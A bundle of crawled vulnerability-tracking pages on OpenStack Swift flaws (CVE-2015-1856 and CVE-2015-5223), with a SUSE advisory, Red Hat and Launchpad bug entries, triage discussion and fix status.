* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2015-1856

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2015-1855.html) [[Index]](index.html) [[Next]](CVE-2015-1858.html)

### Upstream information

[CVE-2015-1856 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1856)

#### Description

OpenStack Object Storage (Swift) before 2.3.0, when allow\_version is configured, allows remote authenticated users to delete the latest version of an object by leveraging listing access to the x-versions-location container.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [moderate](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 5.5 |
| Vector | AV:N/AC:L/Au:S/C:N/I:P/A:P |
| Access Vector | Network |
| Access Complexity | Low |
| Authentication | Single |
| Confidentiality Impact | None |
| Integrity Impact | Partial |
| Availability Impact | Partial |

SUSE Bugzilla entry: [927793](https://bugzilla.suse.com/show_bug.cgi?id=927793) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2015:1846-1](https://lists.suse.com/pipermail/sle-security-updates/2015-October/001652.html), published Fri Oct 30 05:09:48 MDT 2015

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE OpenStack Cloud 5 | * `openstack-swift >= 2.1.0-11.1` * `openstack-swift-account >= 2.1.0-11.1` * `openstack-swift-container >= 2.1.0-11.1` * `openstack-swift-doc >= 2.1.0-11.1` * `openstack-swift-object >= 2.1.0-11.1` * `openstack-swift-proxy >= 2.1.0-11.1` * `python-swift >= 2.1.0-11.1` | Patchnames: sleclo50sp3-openstack-swift-12171 |
| SUSE OpenStack Cloud 6 | * `openstack-swift >= 2.1.0-4.1` * `openstack-swift-account >= 2.1.0-4.1` * `openstack-swift-container >= 2.1.0-4.1` * `openstack-swift-object >= 2.1.0-4.1` * `openstack-swift-proxy >= 2.1.0-4.1` * `python-swift >= 2.1.0-4.1` | Patchnames: SUSE OpenStack Cloud 6 GA openstack-swift-2.1.0-3.1 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SUSE Cloud 2.0 | openstack-swift | Already fixed |
| SUSE Cloud 3 | openstack-swift | Ignore |
| SUSE Cloud 4 | openstack-swift | Ignore |
| SUSE Cloud 4 Dependencies | openstack-swift | Already fixed |
| SUSE Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift-doc | Released |
| Products at an unknown state of their lifecycle. | | |
| SUSE OpenStack Cloud 2.0 | openstack-swift | Already fixed |
| SUSE OpenStack Cloud 3.0 | openstack-swift | Ignore |
| SUSE OpenStack Cloud 4 | openstack-swift | Already fixed |

---

### SUSE Timeline for this CVE

CVE page created: Tue Apr 14 21:44:17 2015

CVE page last modified: Tue Jul 2 16:28:07 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from bugzilla.suse.com_98cf0965_20250126_062855.html ===


| Bugzilla – Bug Access Denied |
| --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D900253)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

## Related documentation

* [Creating an account](https://bugzilla.readthedocs.org/en/5.0/administering/users.html#creating-new-users)

You are not authorized to access bug #900253.
To see this bug, you must
first [log
in to an account](show_bug.cgi?id=900253&GoAheadAndLogIn=1) with the appropriate permissions.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D900253)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from launchpad.net_d116e0ac_20250126_062832.html ===

[Log in / Register](https://launchpad.net/~clay-gerrard/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~clay-gerrard)

## [clayg](https://launchpad.net/~clay-gerrard)

* Overview
* [Code](https://code.launchpad.net/~clay-gerrard)
* [Bugs](https://bugs.launchpad.net/~clay-gerrard)
* [Blueprints](https://blueprints.launchpad.net/~clay-gerrard)
* [Translations](https://translations.launchpad.net/~clay-gerrard)
* [Answers](https://answers.launchpad.net/~clay-gerrard)

* [Related packages](https://launchpad.net/~clay-gerrard/%2Brelated-packages)
* [Related projects](https://launchpad.net/~clay-gerrard/%2Brelated-projects)

## User information

Launchpad Id:
clay-gerrard

Email:
[Log in](%2Blogin) for email information.

Member since:
2010-02-03

[![Icon of OpenStack Team](https://launchpadlibrarian.net/52313052/os14.png "Member of OpenStack Team")](/~openstack)
[![Icon of Swift](https://launchpadlibrarian.net/52560230/os14.png "Member of Swift")](/~swift)

Languages:

English

SSH keys:

[clayg@clayg-desktop](%2Bsshkeys)

[clayg@Clays-MacBook-Pro.local](%2Bsshkeys)

Time zone:

America/Los\_Angeles
(UTC-0800)

Karma:
[36](https://launchpad.net/~clay-gerrard/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

## [All memberships](https://launchpad.net/~clay-gerrard/%2Bparticipation) Latest memberships

| [Ubuntu Wiki Editors](/~ubuntu-wiki-editors)  Joined on 2018-12-21 | |
| --- | --- |
| [Nova volume](/~openstack-volume)  Joined on 2011-10-12 | |
| [Swift Core security contacts](/~swift-coresec)  Joined on 2010-07-16 | |

## [Recent activities](https://launchpad.net/~clay-gerrard/%2Bkarma) Most active in

| [python-swiftclient](/python-swiftclient) |  |
| --- | --- |
| [OpenStack Object Storage (swift)](/swift) |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_358978c3_20250126_062832.html ===

[Log in / Register](https://launchpad.net/~hudson-openstack/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~hudson-openstack)

## [OpenStack Infra](https://launchpad.net/~hudson-openstack)

* Overview
* [Code](https://code.launchpad.net/~hudson-openstack)
* [Bugs](https://bugs.launchpad.net/~hudson-openstack)
* [Blueprints](https://blueprints.launchpad.net/~hudson-openstack)
* [Translations](https://translations.launchpad.net/~hudson-openstack)
* [Answers](https://answers.launchpad.net/~hudson-openstack)

* [Related packages](https://launchpad.net/~hudson-openstack/%2Brelated-packages)
* [Related projects](https://launchpad.net/~hudson-openstack/%2Brelated-projects)

## User information

Launchpad Id:
hudson-openstack

Email:
[Log in](%2Blogin) for email information.

Member since:
2010-07-14

[![Icon of Burrow](https://launchpadlibrarian.net/67728214/os14.png "Member of Burrow")](/~burrow)
[![Icon of Citrix OpenStack development team](https://launchpadlibrarian.net/64472709/Citrix%2014.png "Member of Citrix OpenStack development team")](/~citrix-openstack)
[![Icon of (deprecated) OpenStack PPA maintainers](https://launchpadlibrarian.net/87891894/ppa.gif "Member of (deprecated) OpenStack PPA maintainers")](/~openstack-ppa)
[![Icon of Designate Core](https://launchpadlibrarian.net/360468328/designate_14.jpg "Member of Designate Core")](/~designate-core)
[![Icon of Designate Drivers](https://launchpadlibrarian.net/360468067/designate_14.jpg "Member of Designate Drivers")](/~designate-drivers)
[![Icon of MidoNet Bugs](https://launchpadlibrarian.net/228074955/midonet_14x14.png "Member of MidoNet Bugs")](/~midonet-bugs)
[![Icon of Nova Bug Team](https://launchpadlibrarian.net/108832444/bug.gif "Member of Nova Bug Team")](/~nova-bugs)
[![Icon of Nova](https://launchpadlibrarian.net/52560219/os14.png "Member of Nova")](/~nova)
[![Icon of OpenStack Team](https://launchpadlibrarian.net/52313052/os14.png "Member of OpenStack Team")](/~openstack)

Languages:

English

OpenPGP keys:

72571ACC301E6FE900837F5CDF85501232EE128C

SSH keys:

[hudson@hudson](%2Bsshkeys)

[jenkins@vpcslave](%2Bsshkeys)

Time zone:

UTC
(UTC+0000)

Karma:
[6535](https://launchpad.net/~hudson-openstack/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

## [All memberships](https://launchpad.net/~hudson-openstack/%2Bparticipation) Latest memberships

| [Compute Hyper-V Bugs](/~compute-hyperv-bugs)  Joined on 2019-08-28 | |
| --- | --- |
| [OS-Win Bugs](/~os-win-bugs)  Joined on 2019-08-28 | |
| [Networking Hyper-V Bugs](/~networking-hyperv-bugs)  Joined on 2019-08-28 | |
| [kolla-drivers](/~kolla-drivers)  Joined on 2019-05-20 | |
| [fixtures-git-bugs](/~fixtures-git-bugs)  Joined on 2018-03-25 | |

## [Recent activities](https://launchpad.net/~hudson-openstack/%2Bkarma) Most active in

| [StarlingX](/starlingx) |  |
| --- | --- |
| [kolla-ansible](/kolla-ansible) |  |
| [kolla](/kolla) |  |
| [kayobe](/kayobe) |  |
| [OpenStack Compute (nova)](/nova) |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.redhat.com_196cf055_20250126_062850.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1255622)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1255622)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1255622)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1255622

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1255622**](show_bug.cgi?id=1255622)
(CVE-2015-5223)
- [CVE-2015-5223](https://access.redhat.com/security/cve/CVE-2015-5223) openstack-swift: Information leak via Swift tempurls

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2015-5223 openstack-swift: Information leak via Swift tempurls

| | [Keywords](describekeywords.cgi): | Reopened  Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-5223 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1263018](show_bug.cgi?id=1263018) [1264282](show_bug.cgi?id=1264282 "CLOSED EOL - CVE-2015-5223 openstack-swift: Information leak via Swift tempurls [fedora-all]") [1264283](show_bug.cgi?id=1264283) [1264284](show_bug.cgi?id=1264284) [1264285](show_bug.cgi?id=1264285) [1264286](show_bug.cgi?id=1264286) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1255631](show_bug.cgi?id=1255631) | | TreeView+ | [depends on](buglist.cgi?bug_id=1255622&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1255622&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2015-08-21 08:16 UTC by Adam Mariš | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 21:08 UTC ([History](show_activity.cgi?id=1255622)) | | [CC List:](page.cgi?id=fields.html#cclist) | 29 users (show)  aavati abaron aortega apevec ayoung chrisw dallan derekh gkotton gmollett lhh lpeer markmc nlevinki rbryant rfortier rhs-bugs sankarshan sclewis security-response-team sgirijan sisharma slong smohan srevivo ssaha tdecacqu vbellur zaitcev | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: | A flaw was discovered in the OpenStack Object Storage service (swift) TempURLs. An attacker in possession of a TempURL key with PUT permissions could gain read access to other objects in the same project (tenant). | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2017-03-23 06:31:32 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Bugzilla | [1322227](show_bug.cgi?id=1322227 "CLOSED ERRATA - openstack-swift: Fix for CVE-2015-5223 is partially present in openstack-swift-2.3.0-5.el7ost build") | 0 | unspecified | CLOSED | openstack-swift: Fix for CVE-2015-5223 is partially present in openstack-swift-2.3.0-5.el7ost build | 2023-09-14 03:20:19 UTC | | Red Hat Product Errata | [RHSA-2015:1895](https://access.redhat.com/errata/RHSA-2015%3A1895) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2015-10-15 16:29:17 UTC |   Internal Links: [1322227](show_bug.cgi?id=1322227 "CLOSED ERRATA - openstack-swift: Fix for CVE-2015-5223 is partially present in openstack-swift-2.3.0-5.el7ost build") |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1255622#c0)  Adam Mariš    2015-08-21 08:16:52 UTC  ``` Openstack upstream reported that a vulnerabilty in Swift tempurls was discovered. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setups are affected.  Vulnerability affects versions through 2.3.0.   ```  [Comment 5](show_bug.cgi?id=1255622#c5)  Adam Mariš    2015-08-21 08:46:00 UTC  ``` Acknowledgements:  Red Hat would like to thank the Openstack project for reporting this issue. Upstream acknowledges Richard Hawkins of Rackspace and the Swift core reviewers as the original reporters of this issue.   ```  [Comment 6](show_bug.cgi?id=1255622#c6)  Adam Mariš    2015-08-28 09:17:52 UTC  ``` Public via:  <http://seclists.org/oss-sec/2015/q3/442>   ```  [Comment 10](show_bug.cgi?id=1255622#c10)  Garth Mollett    2015-09-18 06:06:10 UTC  ```  Created openstack-swift tracking bugs for this issue:  Affects: fedora-all [[bug 1264282](show_bug.cgi?id=1264282 "CLOSED EOL - CVE-2015-5223 openstack-swift: Information leak via Swift tempurls [fedora-all]")] Affects: openstack-rdo [[bug 1264286](show_bug.cgi?id=1264286)]   ```  [Comment 12](show_bug.cgi?id=1255622#c12)  errata-xmlrpc    2015-10-15 12:34:10 UTC  ``` This issue has been addressed in the following products:    OpenStack 6 for RHEL 7   OpenStack 7 For RHEL 7   OpenStack 5 for RHEL 6   OpenStack 5 for RHEL 7  Via RHSA-2015:1895 <https://rhn.redhat.com/errata/RHSA-2015-1895.html>   ```  [Comment 14](show_bug.cgi?id=1255622#c14)  Siddharth Sharma    2017-03-23 06:30:43 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 6  Via RHSA-2016:0329 <https://rhn.redhat.com/errata/RHSA-2016-0329.html>   ```  [Comment 15](show_bug.cgi?id=1255622#c15)  Siddharth Sharma    2017-03-23 06:31:32 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 7  Via RHSA-2016:0328 <https://rhn.redhat.com/errata/RHSA-2016-0328.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1255622&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from launchpad.net_2eb2e5bb_20250126_062858.html ===

[Log in / Register](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* [Translations](https://translations.launchpad.net/swift)
* [Answers](https://answers.launchpad.net/swift)

# [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)

Bug #1453948 reported by
[clayg](https://launchpad.net/~clay-gerrard)
on 2015-05-11

[264](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Object Storage (swift)](https://bugs.launchpad.net/swift) | Fix Released | Critical | Unassigned | [OpenStack Object Storage (swift) 2.4.0](https://launchpad.net/swift/%2Bmilestone/2.4.0) |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Medium | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) |  |

### Bug Description

If you get a PUT tempurl you can use DLO's to find objects in the container, or in the account.

If you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.

We should not allow uses to PUT DLO's via tempurl - it's currently insecure because of the existence leak attack; and can be difficult to reason about safely for application authors generating tempurls.

See [original description](comments/0)

Tags:

[in-feature-crypto](/swift/%2Bbugs?field.tag=in-feature-crypto)
[in-feature-hummingbird](/swift/%2Bbugs?field.tag=in-feature-hummingbird)
[in-stable-juno](/swift/%2Bbugs?field.tag=in-stable-juno)
[in-stable-kilo](/swift/%2Bbugs?field.tag=in-stable-kilo)

## CVE References

* [2015-5223](/bugs/cve/2015-5223 "OpenStack Object Storage (Swift) befo...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-11: |  |  | [#1](/swift/%2Bbug/1453948/comments/1) |
| --- | --- | --- | --- |

* [show how to use any PUT tempurl to probe for object/container existance](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4395824/%2Bfiles/put-tempurl-dlo-leak.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4395824)
  (2.1 KiB,
  text/x-diff)

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-05-12

| Changed in ossa: | |
| --- | --- |
| **status**: | New → Confirmed |
| **importance**: | Undecided → Medium |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-14: |  |  | [#2](/swift/%2Bbug/1453948/comments/2) |
| --- | --- | --- | --- |

I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn't be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO's via tempurl in their environments without forcing it on all deployments consuming stable branches.

If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.

I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn't be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO's via tempurl in their environments without forcing it on all deployments consuming stable branches.
If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.

| Changed in ossa: | |
| --- | --- |
| **status**: | Confirmed → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-10: |  |  | [#3](/swift/%2Bbug/1453948/comments/3) |
| --- | --- | --- | --- |

Can someone triage the swift bug ?

This looks like a type B\* bug ( <https://security.openstack.org/vmt-process.html#incident-report-taxonomy> ).

Unless someone object, we'll subscribe ossg-coresec next Monday.

Can someone triage the swift bug ?
This looks like a type B\* bug ( https://security.openstack.org/vmt-process.html#incident-report-taxonomy ).
Unless someone object, we'll subscribe ossg-coresec next Monday.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#4](/swift/%2Bbug/1453948/comments/4) |
| --- | --- | --- | --- |

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1449212](https://bugs.launchpad.net/swift/%2Bbug/1449212) are closely related and should only be disclosed at the same time.

Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1449212 are closely related and should only be disclosed at the same time.

| Changed in swift: | |
| --- | --- |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

